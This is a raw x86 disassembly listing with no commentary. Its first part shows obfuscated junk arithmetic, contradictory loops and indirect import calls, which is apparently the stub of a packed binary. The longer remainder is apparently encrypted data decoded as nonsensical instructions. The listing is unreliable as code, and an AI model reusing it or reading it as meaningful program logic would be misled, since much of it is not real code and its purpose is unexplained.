  40fc69:	adc    DWORD PTR ds:0x428e49,0x78c3
  40fc73:	xor    ebx,eax
  40fc75:	sub    edx,ebx
  40fc77:	not    DWORD PTR ds:0x428e65
  40fc7d:	sub    edx,esi
  40fc7f:	xor    edx,eax
  40fc81:	sub    DWORD PTR ds:0x428ec1,ebx
  40fc87:	mov    DWORD PTR [ebp+0x8],edx
  40fc8a:	mov    DWORD PTR ds:0x428e81,0x18
  40fc94:	cmp    DWORD PTR ds:0x428e81,0x0
  40fc9b:	je     0x40fcef
  40fca1:	cmp    DWORD PTR ds:0x428e81,0x9
  40fca8:	jg     0x40fcef
  40fcae:	jmp    0x40fcc1
  40fcb3:	push   DWORD PTR [ebp-0x1c]
  40fcb6:	push   0x8c8f
  40fcbb:	call   DWORD PTR ds:0x42ca1c
  40fcc1:	cmp    DWORD PTR ds:0x428e81,0xa
  40fcc8:	jne    0x40fcdd
  40fcce:	xor    edx,edx
  40fcd0:	xor    edx,DWORD PTR ds:0x428e81
  40fcd6:	dec    edx
  40fcd7:	mov    DWORD PTR ds:0x428e81,edx
  40fcdd:	mov    edx,DWORD PTR ds:0x428e81
  40fce3:	dec    edx
  40fce4:	mov    DWORD PTR ds:0x428e81,edx
  40fcea:	jmp    0x40fc94
  40fcef:	mov    edx,DWORD PTR [ebp+0x8]
  40fcf2:	adc    ebx,0x7b56
  40fcf8:	mov    ebx,DWORD PTR [ebp-0x58]
  40fcfb:	sub    DWORD PTR ds:0x428ea9,0xceb
  40fd05:	lea    edx,[ebx+edx*1+0x5708f8]
  40fd0c:	mov    DWORD PTR ds:0x428e91,0x63b8
  40fd16:	mov    DWORD PTR [ebp-0x58],edx
  40fd19:	mov    edx,DWORD PTR [ebp+0x8]
  40fd1c:	mov    ebx,DWORD PTR [ebp-0x54]
  40fd1f:	add    edx,0x64f89a
  40fd25:	adc    DWORD PTR ds:0x428e6d,0x428e79
  40fd2f:	imul   edx,ebx
  40fd32:	mov    DWORD PTR [ebp-0x54],edx
  40fd35:	xor    ebx,edx
  40fd37:	mov    edx,DWORD PTR [ebp+0x8]
  40fd3a:	xor    DWORD PTR ds:0x428e75,0x629e
  40fd44:	mov    ebx,DWORD PTR [ebp-0x50]
  40fd47:	mov    DWORD PTR ds:0x428ea5,0x655f
  40fd51:	add    edx,0x242ebed
  40fd57:	mov    DWORD PTR ds:0x428e49,0x3be8
  40fd61:	and    edx,ebx
  40fd63:	and    DWORD PTR ds:0x428e5d,0x0
  40fd6d:	jmp    0x40fd7f
  40fd72:	mov    ebx,DWORD PTR ds:0x428e5d
  40fd78:	inc    ebx
  40fd79:	mov    DWORD PTR ds:0x428e5d,ebx
  40fd7f:	cmp    DWORD PTR ds:0x428e5d,0x1e
  40fd86:	jae    0x412148
  40fd8c:	cmp    DWORD PTR ds:0x428e5d,0x8
  40fd93:	ja     0x412148
  40fd99:	jmp    0x40fdae
  40fd9e:	push   0x4280dc
  40fda3:	push   0x2c09
  40fda8:	call   DWORD PTR ds:0x42ca20
  40fdae:	cmp    DWORD PTR ds:0x428e5d,0x7
  40fdb5:	jne    0x40fdca
  40fdbb:	xor    ebx,ebx
  40fdbd:	xor    ebx,DWORD PTR ds:0x428e5d
  40fdc3:	inc    ebx
  40fdc4:	mov    DWORD PTR ds:0x428e5d,ebx
  40fdca:	jmp    0x40fd72
  40fdcf:	jmp    0x412148
  40fdd4:	xadd   edi,edi
  40fdd7:	dec    ebx
  40fdd8:	push   ecx
  40fdd9:	dec    ebp
  40fdda:	dec    edi
  40fddb:	sar    eax,0xe5
  40fdde:	mov    al,ah
  40fde0:	(bad)  
  40fde1:	mov    bh,0xef
  40fde3:	jbe    0x40fd97
  40fde5:	dec    edi
  40fde6:	jnp    0x40fe63
  40fde8:	xlat   BYTE PTR ds:[ebx]
  40fde9:	sahf   
  40fdea:	jnp    0x40fe67
  40fdec:	jl     0x40fdd9
  40fdee:	mov    DWORD PTR [edi+0x70],ecx
  40fdf1:	(bad)  
  40fdf2:	lds    ecx,FWORD PTR [edi-0xf097f31]
  40fdf8:	test   al,0xc8
  40fdfa:	enter  0x9723,0x72
  40fdfe:	cwde   
  40fdff:	sbb    eax,0x52bfcf22
  40fe04:	sahf   
  40fe05:	inc    ebx
  40fe06:	dec    ebx
  40fe07:	cmp    al,0x36
  40fe09:	add    DWORD PTR [eax+0x5b],esi
  40fe0c:	pop    ebp
  40fe0d:	jmp    0x40fe64
  40fe0f:	fdivr  st,st(0)
  40fe11:	out    0xa,eax
  40fe13:	or     BYTE PTR [edi],dl
  40fe15:	aaa    
  40fe16:	or     BYTE PTR ds:0x59ba9cc4,bh
  40fe1c:	outs   dx,BYTE PTR ds:[esi]
  40fe1d:	fadd   DWORD PTR [esi]
  40fe1f:	adc    bh,BYTE PTR [edi+0x7fec1513]
  40fe25:	lea    ebx,[ecx-0x1d]
  40fe28:	je     0x40fe5b
  40fe2a:	inc    ebx
  40fe2b:	ret    0x500
  40fe2e:	dec    esp
  40fe2f:	push   es
  40fe30:	pop    ds
  40fe31:	mov    ebx,DWORD PTR [ecx]
  40fe33:	adc    eax,0x6fb6ba8d
  40fe38:	adc    bh,dl
  40fe3a:	js     0x40feb7
  40fe3c:	shl    BYTE PTR [esi],1
  40fe3e:	ss (bad) 
  40fe40:	fnstsw WORD PTR [esi+0x54]
  40fe43:	push   ds
  40fe44:	pop    esi
  40fe45:	inc    ebp
  40fe46:	inc    ebx
  40fe47:	cmp    al,0x90
  40fe49:	cmc    
  40fe4a:	into   
  40fe4b:	mov    esp,0xf8acf8af
  40fe50:	mov    ebp,0x162e58f2
  40fe55:	ror    BYTE PTR [edx-0x63e7e119],1
  40fe5b:	push   esp
  40fe5c:	(bad)  
  40fe5d:	jecxz  0x40fdee
  40fe5f:	dec    ecx
  40fe60:	add    BYTE PTR [edx],dl
  40fe62:	add    esi,DWORD PTR [eax]
  40fe64:	sbb    edx,edx
  40fe66:	repz push ss
  40fe68:	sar    DWORD PTR [eax+0x29],1
  40fe6b:	mov    bl,0x2c
  40fe6d:	inc    esp
  40fe6e:	shl    DWORD PTR [esi+0xa283cd2],1
  40fe74:	fwait
  40fe75:	xor    ecx,DWORD PTR [ebp+0x28e76a3d]
  40fe7b:	rol    BYTE PTR [eax-0x6ce01fca],cl
  40fe81:	adc    ch,cl
  40fe83:	ffreep st(4)
  40fe85:	push   0xbb170491
  40fe8a:	sub    DWORD PTR [ecx+0x102f08fb],ebp
  40fe90:	sub    ch,BYTE PTR [ebx-0x3673c5e6]
  40fe96:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fe98:	(bad)
  40fe9c:	or     ch,BYTE PTR [ebx+eiz*8+0x7a]
  40fea0:	mov    edi,0x1ae23773
  40fea5:	jbe    0x40ff04
  40fea7:	xor    bl,BYTE PTR [ebp+edi*8+0x6d]
  40feab:	int3   
  40feac:	pop    es
  40fead:	xchg   esi,eax
  40feae:	loope  0x40ff16
  40feb0:	aad    0xac
  40feb2:	jg     0x40feb7
  40feb4:	push   ss
  40feb5:	xchg   BYTE PTR [ebx+0x4f2e574b],ah
  40febb:	sub    cl,ch
  40febd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40febe:	fdiv   DWORD PTR [ebx]
  40fec0:	(bad)  
  40fec1:	std    
  40fec2:	loope  0x40fe76
  40fec4:	ins    BYTE PTR es:[edi],dx
  40fec5:	imul   esi,DWORD PTR [ebp+0x5cbbe6c8],0x1f7c3d25
  40fecf:	pop    ecx
  40fed0:	dec    esi
  40fed1:	jo     0x40fe89
  40fed3:	mov    bl,0xc4
  40fed5:	or     eax,0x766a5ae5
  40feda:	mov    fs,WORD PTR [esi+eiz*4]
  40fedd:	mov    ch,ah
  40fedf:	js     0x40ff5f
  40fee1:	call   0xb0ebdb6f
  40fee6:	and    al,BYTE PTR [eax]
  40fee8:	test   al,0xb1
  40feea:	rcr    DWORD PTR [ebx+0x4e],0x22
  40feee:	mov    edi,0xfc9d00c8
  40fef3:	je     0x40ff52
  40fef5:	adc    BYTE PTR [ebx+0x4b],bl
  40fef8:	rcl    edx,1
  40fefa:	sbb    al,0xd7
  40fefc:	and    esi,ecx
  40fefe:	nop
  40feff:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ff00:	fld    DWORD PTR [edx]
  40ff02:	adc    DWORD PTR [ecx-0x360c7df1],0x70
  40ff09:	hlt    
  40ff0a:	ret    
  40ff0b:	fild   DWORD PTR [edi+eiz*4-0x6c15b5ee]
  40ff12:	out    dx,al
  40ff13:	bound  ebx,QWORD PTR [edi-0x5f05c90d]
  40ff19:	sbb    dl,cl
  40ff1b:	inc    ebp
  40ff1c:	cdq    
  40ff1d:	push   ebp
  40ff1e:	out    dx,eax
  40ff1f:	cmp    BYTE PTR [eax+0x2f407725],ah
  40ff25:	and    al,0xf3
  40ff27:	push   edx
  40ff28:	push   ebx
  40ff29:	loop   0x40ff94
  40ff2b:	ret    0x26e0
  40ff2e:	add    DWORD PTR [edx-0x35],esp
  40ff31:	(bad)  
  40ff32:	ds mov ebp,0x2235180a
  40ff38:	call   0xc172:0x2db31d5d
  40ff3f:	mov    al,0xde
  40ff41:	adc    BYTE PTR [eax],al
  40ff43:	inc    edi
  40ff44:	or     ah,BYTE PTR [edx+0xc927c51]
  40ff4a:	fcom   QWORD PTR [edx+ebx*8-0x426dffbe]
  40ff51:	mov    ch,0xfb
  40ff53:	adc    ch,BYTE PTR [edi+0x63]
  40ff56:	fiadd  DWORD PTR [ecx-0x63c9d474]
  40ff5c:	mov    ebp,0xac2f7143
  40ff61:	pop    ebp
  40ff62:	bound  ebx,QWORD PTR [edi+ebx*2]
  40ff65:	data16 mov ds:0xfe17c1e6,al
  40ff6b:	not    BYTE PTR [ebx-0x7bdcf38c]
  40ff71:	xor    al,0x26
  40ff73:	xor    eax,0x7400ef17
  40ff78:	scas   al,BYTE PTR es:[edi]
  40ff79:	jle    0x40ff38
  40ff7b:	jae    0x40ff19
  40ff7d:	in     al,0xc
  40ff7f:	push   ebx
  40ff80:	sti    
  40ff81:	push   cs
  40ff82:	mov    eax,ds:0x112ec9cf
  40ff87:	cwde   
  40ff88:	ret    0x9b13
  40ff8b:	jmp    0x40ffd1
  40ff8d:	jno    0x40ffce
  40ff8f:	pop    es
  40ff90:	dec    ecx
  40ff91:	addr16 jmp 0x453a:0x1186f745
  40ff99:	bound  ebx,QWORD PTR [esp+edx*2-0x17a91ceb]
  40ffa0:	add    al,0x68
  40ffa2:	adc    ebp,ebp
  40ffa4:	cmc    
  40ffa5:	fstp   DWORD PTR [esi+0x6c]
  40ffa8:	add    edi,DWORD PTR [edx+0x65]
  40ffab:	adc    dh,BYTE PTR [ecx-0x42c52bef]
  40ffb1:	fimul  WORD PTR [ebp+0x71]
  40ffb4:	(bad)  
  40ffb5:	push   ss
  40ffb6:	and    ecx,DWORD PTR [edx]
  40ffb8:	xchg   ebp,eax
  40ffb9:	jg     0x40ffe8
  40ffbb:	jmp    FWORD PTR [esi+ecx*8+0x1e]
  40ffbf:	xchg   esi,eax
  40ffc0:	pop    esp
  40ffc1:	shr    ch,1
  40ffc3:	dec    esi
  40ffc4:	fldcw  WORD PTR [ebx+0x2a]
  40ffc7:	(bad)  
  40ffc9:	fwait
  40ffca:	inc    eax
  40ffcb:	xchg   esi,eax
  40ffcc:	popf   
  40ffcd:	or     al,BYTE PTR [ebx-0x13]
  40ffd0:	sub    edi,eax
  40ffd2:	jno    0x40ff59
  40ffd4:	dec    DWORD PTR [esi+0x2af40d62]
  40ffda:	sti    
  40ffdb:	sub    al,0xb4
  40ffdd:	adc    al,0x73
  40ffdf:	popa   
  40ffe0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ffe1:	fistp  WORD PTR [edx+0x4a]
  40ffe4:	jmp    0x40ff92
  40ffe6:	mov    ah,0x7
  40ffe8:	pop    esp
  40ffe9:	adc    DWORD PTR [ebp-0x59],esp
  40ffec:	repnz and eax,0x7fc5b5f3
  40fff2:	cmc    
  40fff3:	pop    esp
  40fff4:	fs jp  0x410013
  40fff7:	jecxz  0x40fff5
  40fff9:	ins    BYTE PTR es:[edi],dx
  40fffa:	xchg   ecx,eax
  40fffb:	mov    esi,0x161d2999
  410000:	mov    ch,0x2b
  410002:	mov    eax,ds:0xfa7b5300
  410007:	pop    esi
  410008:	ins    DWORD PTR es:[edi],dx
  410009:	dec    ebx
  41000a:	call   0x4a5:0x6ed1b365
  410011:	sub    al,0x85
  410013:	lods   al,BYTE PTR ds:[esi]
  410014:	sbb    BYTE PTR [eax],dh
  410016:	dec    eax
  410017:	or     al,0xda
  410019:	test   eax,0x3bb9f4f9
  41001e:	cld    
  41001f:	and    BYTE PTR [ecx],bh
  410021:	sbb    cl,0x52
  410024:	loopne 0x40ffbe
  410026:	(bad)  
  410027:	cs xchg edi,eax
  410029:	(bad)  [ebp+ebx*2-0x65490ce9]
  410030:	push   ds
  410031:	push   ds
  410032:	pop    esp
  410033:	jae    0x40ffbd
  410035:	push   0xffffffac
  410037:	repz sub DWORD PTR [eax+0x66d895a2],ecx
  41003e:	call   0x6c0c:0x610c0b39
  410045:	pop    eax
  410046:	pop    es
  410047:	leave  
  410048:	pop    ebp
  410049:	cmc    
  41004a:	js     0x41006f
  41004c:	das    
  41004d:	push   ds
  41004e:	mov    al,ds:0x65d50b54
  410053:	fld    QWORD PTR [ebx]
  410055:	lea    esp,[edi-0x5e]
  410058:	ss mov bl,0x8b
  41005b:	inc    esp
  41005c:	xchg   esp,eax
  41005d:	add    ch,BYTE PTR [esi]
  41005f:	pop    ds
  410060:	and    BYTE PTR [eax],cl
  410062:	cmp    DWORD PTR [esi-0x1d79dc42],ebp
  410068:	inc    esp
  410069:	push   edx
  41006a:	jmp    0x410021
  41006c:	daa    
  41006d:	dec    edx
  41006e:	sub    BYTE PTR [edi],ah
  410070:	in     al,0x60
  410072:	ret    
  410073:	sbb    eax,0x7956384a
  410078:	pop    ebx
  410079:	dec    esi
  41007a:	fistp  WORD PTR [esi-0x11]
  41007d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41007e:	fcomp  DWORD PTR [esi-0x2b]
  410081:	(bad)
  410085:	cdq    
  410086:	mov    bh,0x95
  410088:	mov    ds:0x6599bc63,eax
  41008d:	in     eax,dx
  41008e:	scas   al,BYTE PTR es:[edi]
  41008f:	mov    edi,0x186842a9
  410094:	jns    0x410078
  410096:	test   al,0xf6
  410098:	call   DWORD PTR [eax+eax*8]
  41009b:	mov    cl,0x15
  41009d:	std    
  41009e:	das    
  41009f:	loope  0x41011b
  4100a1:	ffreep st(7)
  4100a3:	xchg   edi,eax
  4100a4:	cld    
  4100a5:	imul   edx,eax,0x7ede4c69
  4100ab:	xchg   esi,eax
  4100ac:	xchg   ebx,eax
  4100ad:	leave  
  4100ae:	inc    esi
  4100af:	cdq    
  4100b0:	xchg   esp,eax
  4100b1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4100b2:	lock aam 0x31
  4100b5:	adc    eax,0x651cdb39
  4100ba:	jecxz  0x4100b7
  4100bc:	(bad)  [edi-0x63]
  4100bf:	retf   
  4100c0:	ja     0x410129
  4100c2:	(bad)  
  4100c3:	xor    eax,0xa1a52111
  4100c8:	div    DWORD PTR [ecx]
  4100ca:	xor    eax,0xa2a3621d
  4100cf:	test   eax,0x5dbc1d93
  4100d4:	adc    DWORD PTR [edi+0x3c80f101],esp
  4100da:	pop    ecx
  4100db:	cmp    eax,DWORD PTR [esi-0x43]
  4100de:	push   eax
  4100df:	iret   
  4100e0:	lea    esi,[ecx+0x1b]
  4100e3:	test   al,0x8e
  4100e5:	mov    WORD PTR ds:0x2416cffd,?
  4100eb:	lods   eax,DWORD PTR ds:[esi]
  4100ec:	hlt    
  4100ed:	sbb    cl,dl
  4100ef:	sar    BYTE PTR [ebp+0x2a],cl
  4100f2:	repz pop edi
  4100f4:	xchg   ebp,eax
  4100f5:	pop    edi
  4100f6:	sar    BYTE PTR [ebp-0x28c7efad],0xce
  4100fd:	sub    eax,0x71fe9e17
  410102:	xchg   ebx,eax
  410103:	adc    BYTE PTR ds:0x8a482a1a,0xd2
  41010a:	push   ecx
  41010b:	retf   0x5e2e
  41010e:	xsavec fs:[ecx]
  410112:	dec    edx
  410113:	mov    dl,0xf3
  410115:	pop    esi
  410116:	int    0x9a
  410118:	mov    edi,0x95477f7f
  41011d:	scas   al,BYTE PTR es:[edi]
  41011e:	fs dec ebp
  410120:	and    al,0x38
  410122:	mov    dh,0x9b
  410124:	jmp    0x4100b0
  410126:	(bad)
  41012a:	push   esp
  41012b:	gs ss popf 
  41012e:	out    dx,al
  41012f:	fstp   TBYTE PTR [ebp-0x5621f626]
  410135:	pop    ss
  410136:	add    eax,0xfbd5eb4d
  41013b:	xor    eax,0xa7a47b46
  410140:	in     eax,dx
  410141:	sbb    BYTE PTR [eax-0x1c],cl
  410144:	mov    ebx,0xef211d39
  410149:	push   0x6f
  41014b:	test   DWORD PTR [ecx+ebp*4+0x75],0x1ff2b278
  410153:	xchg   edx,eax
  410154:	fdivr  QWORD PTR [ebp-0x3f21423a]
  41015a:	add    BYTE PTR [ebp-0x2d4fcda6],al
  410160:	pop    edi
  410161:	outs   dx,DWORD PTR ds:[esi]
  410162:	js     0x410158
  410164:	les    esi,FWORD PTR [ecx+0x5a]
  410167:	cmp    DWORD PTR [ecx+0x26fb9b33],esi
  41016d:	inc    ebp
  41016e:	(bad)  
  41016f:	fstp   TBYTE PTR [eax]
  410171:	iret   
  410172:	sub    edx,DWORD PTR [edx]
  410174:	out    0xc0,eax
  410176:	sub    al,0xbb
  410178:	in     eax,dx
  410179:	sub    BYTE PTR [ebx],bl
  41017b:	cmp    BYTE PTR [ecx+edx*2-0x6854e4c0],dh
  410182:	xor    dl,BYTE PTR [ebx+0x16b6cb51]
  410188:	(bad)  
  41018a:	dec    ebx
  41018b:	mov    ebp,0x7e28121a
  410190:	in     al,dx
  410191:	xchg   esi,eax
  410192:	jmp    0xf434:0xe0c55d37
  410199:	into   
  41019a:	(bad)  
  41019b:	faddp  st(1),st
  41019d:	int    0xe8
  41019f:	jbe    0x41012c
  4101a1:	into   
  4101a2:	in     al,dx
  4101a3:	or     al,0x8b
  4101a5:	ins    BYTE PTR es:[edi],dx
  4101a6:	pop    eax
  4101a7:	lea    edi,[ebx]
  4101a9:	call   0xde660160
  4101ae:	mov    ebx,0x1fd31712
  4101b3:	sub    esp,DWORD PTR [esi]
  4101b5:	or     DWORD PTR [ecx],ebx
  4101b7:	stc    
  4101b8:	sub    eax,0xb3ceddf7
  4101bd:	cmp    DWORD PTR ds:0x35f34bdf,esp
  4101c3:	push   ebp
  4101c4:	rol    edx,0x0
  4101c7:	clc    
  4101c8:	cmp    eax,0x36392a50
  4101cd:	add    ch,BYTE PTR [esi+ecx*1]
  4101d0:	mov    esi,DWORD PTR [edx-0x992c9c1]
  4101d6:	shl    BYTE PTR [ebp-0x24f7de23],1
  4101dc:	xor    DWORD PTR ds:0x31d9416f,ebp
  4101e2:	cs jge 0x410242
  4101e5:	and    DWORD PTR [ebp+0x652ba611],esp
  4101eb:	lods   eax,DWORD PTR ds:[esi]
  4101ec:	push   esp
  4101ed:	jno    0x41021b
  4101ef:	pop    esi
  4101f0:	jno    0x410199
  4101f2:	(bad)  
  4101f3:	call   0xb923:0x394d0431
  4101fa:	jmp    0x4101dd
  4101fc:	std    
  4101fd:	mov    ecx,0x2fb1f073
  410202:	mov    ch,0xc4
  410204:	cmp    DWORD PTR [ebx],0x5324c7f9
  41020a:	push   esp
  41020b:	out    dx,eax
  41020c:	jnp    0x4101e0
  41020e:	outs   dx,BYTE PTR ds:[esi]
  41020f:	xor    eax,DWORD PTR [esi+0x35]
  410212:	xchg   ebx,eax
  410213:	or     al,0xcb
  410215:	xor    edi,DWORD PTR [eax]
  410217:	loope  0x410228
  410219:	mov    dh,BYTE PTR [ecx]
  41021b:	out    dx,al
  41021c:	aam    0x69
  41021e:	retf   
  41021f:	sub    DWORD PTR [ebp-0x22a2c497],edi
  410225:	and    ch,BYTE PTR [edi]
  410227:	into   
  410228:	sub    DWORD PTR [ecx+0x1d],0x74
  41022c:	cld    
  41022d:	ds jg  0x41026d
  410230:	aaa    
  410231:	les    esi,FWORD PTR [ecx-0x26]
  410234:	pop    ds
  410235:	jl     0x41026e
  410237:	mov    ds:0x7118e2dd,al
  41023c:	adc    esi,ecx
  41023e:	push   edx
  41023f:	pop    eax
  410240:	test   DWORD PTR [edi+0x3d223170],ecx
  410246:	cmp    DWORD PTR [edx],ebp
  410248:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410249:	aad    0xfc
  41024b:	call   0x5808:0xec86dac0
  410252:	sar    bh,1
  410254:	push   ds
  410255:	adc    esi,edi
  410257:	imul   edx,DWORD PTR ds:0xdc11ad8,0x3a
  41025e:	int3   
  41025f:	and    eax,0x59a9cb39
  410264:	test   al,0x5c
  410266:	jmp    0x5f24f69b
  41026b:	cmp    eax,0xcc01d81e
  410270:	mul    BYTE PTR [esi-0x5b]
  410273:	das    
  410274:	std    
  410275:	leave  
  410276:	push   ebp
  410277:	and    edx,ecx
  410279:	leave  
  41027a:	call   0x747c:0xb1bd32cf
  410281:	ficomp DWORD PTR [eax-0x62]
  410284:	push   0xa8516f71
  410289:	fwait
  41028a:	retf   
  41028b:	shr    BYTE PTR [ebp-0x7a],1
  41028e:	add    DWORD PTR [edx+0x2d173f4c],edi
  410294:	dec    esi
  410295:	idiv   BYTE PTR [edi-0xa]
  410298:	daa    
  410299:	and    eax,0xcc5eb2d4
  41029e:	xchg   DWORD PTR [ebp+0x356bcb54],ebx
  4102a4:	inc    ebp
  4102a5:	out    dx,al
  4102a6:	or     BYTE PTR [edx-0x2a],0xcf
  4102aa:	jbe    0x410325
  4102ac:	(bad)  
  4102ad:	gs pop es
  4102af:	sbb    ecx,DWORD PTR [ecx]
  4102b1:	daa    
  4102b2:	fisub  WORD PTR [edi+0x23d92c4f]
  4102b8:	cmovp  edi,eax
  4102bb:	add    DWORD PTR [edi+ecx*1-0x11],eax
  4102bf:	and    BYTE PTR [esi+0x1d],ch
  4102c2:	mov    edi,0xad823050
  4102c7:	mov    edx,0x912dacb1
  4102cc:	jo     0x1220b964
  4102d2:	push   es
  4102d3:	inc    ecx
  4102d4:	jbe    0x4102e5
  4102d6:	or     BYTE PTR [edx-0x52],dl
  4102d9:	add    eax,0x11b030bf
  4102de:	rcl    BYTE PTR [ecx+edi*4],1
  4102e1:	sahf   
  4102e2:	data16 sbb al,BYTE PTR [esp+edi*4]
  4102e6:	mov    cl,0x7
  4102e8:	std    
  4102e9:	jbe    0x41035f
  4102eb:	sar    dh,cl
  4102ed:	popa   
  4102ee:	aam    0xd0
  4102f0:	xchg   edx,eax
  4102f1:	push   edx
  4102f2:	push   ecx
  4102f3:	mov    al,0x66
  4102f5:	jbe    0x410289
  4102f7:	jns    0x4102e2
  4102f9:	cmp    ebp,ecx
  4102fb:	push   eax
  4102fc:	and    edx,ebp
  4102fe:	dec    esp
  4102ff:	xchg   esp,eax
  410300:	enter  0xdb0c,0x16
  410304:	cmp    BYTE PTR [edx+ebx*2-0x6f],dl
  410308:	jbe    0x4102f0
  41030a:	ins    BYTE PTR es:[edi],dx
  41030b:	sbb    eax,0xd6b76d0c
  410310:	or     eax,0x43511424
  410315:	xchg   ebp,eax
  410316:	scas   al,BYTE PTR es:[edi]
  410317:	and    al,0x3c
  410319:	push   esi
  41031a:	mov    DWORD PTR [edi-0x626cd35],esp
  410320:	(bad)  
  410321:	pushf  
  410322:	(bad)  [ecx+0x3]
  410325:	jne    0x41033e
  410327:	mov    esp,0x4dcf8f21
  41032c:	sub    edi,DWORD PTR [edx]
  41032e:	fdivr  st(1),st
  410330:	fwait
  410331:	xchg   edx,eax
  410332:	rcl    DWORD PTR [eax+edx*4],0x49
  410336:	xor    dl,BYTE PTR [ebp-0x3a769aa5]
  41033c:	dec    esp
  41033d:	adc    ecx,DWORD PTR [esi+esi*1+0x47]
  410341:	pop    esi
  410342:	jmp    0x284a:0x96de3156
  410349:	(bad)  
  41034b:	push   es
  41034c:	into   
  41034d:	dec    ebx
  41034e:	xor    eax,0xd14e69e6
  410353:	add    edx,edi
  410355:	add    esp,esp
  410357:	sub    dl,BYTE PTR [esi+0x43]
  41035a:	xor    dl,BYTE PTR [esi]
  41035c:	loopne 0x410300
  41035e:	stc    
  41035f:	and    cl,BYTE PTR [eax+edx*8-0x18]
  410363:	mov    ecx,0x1037801f
  410368:	cmp    edx,esp
  41036a:	rol    BYTE PTR ds:0xde317b57,cl
  410370:	cmp    bl,BYTE PTR [esi+0x12e3d55a]
  410376:	lods   al,BYTE PTR ds:[esi]
  410377:	ins    BYTE PTR es:[edi],dx
  410378:	out    0xe6,eax
  41037a:	push   ebp
  41037b:	cmp    edi,eax
  41037d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41037e:	pop    es
  41037f:	jbe    0x4103b2
  410381:	imul   edx
  410383:	test   eax,0x7cf15997
  410388:	aad    0xed
  41038a:	xchg   ebp,eax
  41038b:	jno    0x41039a
  41038d:	je     0x4103c5
  41038f:	std    
  410390:	popf   
  410391:	pop    ebp
  410392:	arpl   WORD PTR [ebx*8-0x53b1b05e],di
  410399:	push   edi
  41039a:	icebp  
  41039b:	cmp    BYTE PTR [ebx+0x33],cl
  41039e:	sbb    BYTE PTR [edi-0x40],dl
  4103a1:	fwait
  4103a2:	ret    
  4103a3:	sbb    edx,DWORD PTR [esi-0x45]
  4103a6:	fisubr DWORD PTR [ebx+0x378483be]
  4103ac:	repz xor eax,0x20e39082
  4103b2:	and    esp,DWORD PTR [esi+ecx*8-0x3]
  4103b6:	inc    esp
  4103b7:	fimul  DWORD PTR [ebp-0x34c8f6d2]
  4103bd:	xlat   BYTE PTR ds:[ebx]
  4103be:	(bad)  
  4103bf:	(bad)  
  4103c0:	add    al,ch
  4103c2:	fild   QWORD PTR [ebx+ecx*1+0x69]
  4103c6:	ror    ebx,1
  4103c8:	push   eax
  4103c9:	(bad)  [ecx+ecx*2]
  4103cc:	and    eax,0x6efda6b5
  4103d1:	sub    BYTE PTR [ebp+edi*8-0x12],ch
  4103d5:	out    dx,al
  4103d6:	xchg   ecx,eax
  4103d7:	mov    ds:0xf8c476f2,al
  4103dc:	cmp    cl,al
  4103de:	jmp    0x410426
  4103e0:	mov    al,0xbf
  4103e2:	dec    edi
  4103e3:	dec    esp
  4103e4:	cmp    eax,0x3bde20f6
  4103e9:	mov    eax,0x31016938
  4103ee:	inc    edx
  4103ef:	sub    DWORD PTR [edx+0x41],esp
  4103f2:	mov    ds:0xf87d0219,al
  4103f7:	leave  
  4103f8:	mov    ch,0x4b
  4103fa:	xchg   esi,eax
  4103fb:	push   ebp
  4103fc:	fs aad 0x86
  4103ff:	inc    ebp
  410400:	jae    0x4103c4
  410402:	pop    ebp
  410403:	call   0xf4d9:0xac391b77
  41040a:	xchg   DWORD PTR [ebp+0x53],ecx
  41040d:	leave  
  41040e:	sub    eax,0xc8815cce
  410413:	mov    ch,0x10
  410415:	outs   dx,BYTE PTR ds:[esi]
  410416:	out    dx,al
  410417:	jb     0x4103b2
  410419:	loop   0x41047e
  41041b:	test   eax,0x156a17b7
  410420:	xor    bl,cl
  410422:	lea    ebx,[ebp+0x69]
  410425:	pop    ecx
  410426:	sar    BYTE PTR [eax-0x3c],cl
  410429:	jo     0x41042a
  41042b:	test   ecx,edx
  41042d:	hlt    
  41042e:	pop    ss
  41042f:	test   DWORD PTR [ebp-0x6a],esp
  410432:	cmp    dl,BYTE PTR [ecx-0x2350847f]
  410438:	test   al,0x2c
  41043a:	dec    esp
  41043b:	cmp    ah,BYTE PTR [ebp+0x4c26bf7d]
  410441:	ja     0x410414
  410443:	dec    edx
  410444:	into   
  410445:	or     DWORD PTR [ebx+0x4f],esp
  410448:	push   edx
  410449:	mov    al,ds:0xe390a9bd
  41044e:	push   cs
  41044f:	pop    ss
  410450:	cmp    dh,ch
  410452:	ss (bad) 
  410454:	fxtract 
  410456:	mov    ebp,0x561ca3fb
  41045b:	mov    edi,es
  41045d:	mov    ah,0xa0
  41045f:	pop    ebx
  410460:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410461:	bound  esi,QWORD PTR [edx-0x13]
  410464:	mov    es,WORD PTR [edx-0x1146c7de]
  41046a:	mov    ds:0x232620c6,al
  41046f:	std    
  410470:	call   0xa8d86b48
  410475:	stc    
  410476:	push   esp
  410477:	mul    BYTE PTR [edx]
  410479:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41047a:	adc    ah,0x5c
  41047d:	gs jae 0x410459
  410480:	out    dx,eax
  410481:	fbld   TBYTE PTR ds:0xdd6f937f
  410487:	jbe    0x410458
  410489:	das    
  41048a:	or     al,0x83
  41048c:	cmp    ah,BYTE PTR [ebp-0x3e17ca33]
  410492:	mov    edi,es
  410494:	and    eax,0x547e2359
  410499:	inc    eax
  41049a:	gs jge 0x4104d0
  41049d:	push   0x52
  41049f:	pop    ecx
  4104a0:	retf   0x80ff
  4104a3:	ret    
  4104a4:	xchg   ebp,eax
  4104a5:	inc    ecx
  4104a6:	jp     0x4104f2
  4104a8:	sbb    DWORD PTR [edx+0x18bd2c6b],eax
  4104ae:	pop    ss
  4104af:	add    BYTE PTR [edi+0x323373fb],dh
  4104b5:	lds    esp,FWORD PTR [esi]
  4104b7:	pop    ds
  4104b8:	jmp    0x1c6e:0xa15fca03
  4104bf:	xor    edi,ebx
  4104c1:	and    DWORD PTR [eax+0x3a11acc],0xffffff9e
  4104c8:	push   esi
  4104c9:	dec    edx
  4104ca:	cmc    
